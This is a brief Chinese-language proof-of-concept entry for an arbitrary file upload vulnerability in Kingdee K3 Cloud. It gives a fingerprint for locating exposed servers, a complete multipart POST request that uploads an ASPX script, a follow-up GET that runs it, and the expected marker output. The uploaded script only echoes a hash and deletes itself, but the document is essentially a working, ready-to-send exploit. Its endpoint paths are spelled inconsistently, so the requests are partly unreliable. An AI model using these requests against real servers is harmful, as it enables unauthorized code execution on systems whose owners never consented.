# 金蝶K3财务软件系统MOBFileUpload存在任意文件上传漏洞

- **系统**：金蝶　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="HTML5/content/themes/kdcss.min.css"`
- **请求**：`POST /k3cloud/FIleUplloadServices/MOBFileUpload.ashx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk…`

**请求体 / payload**
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: text/plain
<%@ Page Language="C#" %>
<%
Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
System.IO.File.Delete(Request.PhysicalPath);
%>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
上传定位
GET /k3cloud/FileeUploadServices/uplloadfiles/1.aspx HTTP/1.1
Host:
```
- **预期**：200　|　e165421110ba03099a1c0393373c5b43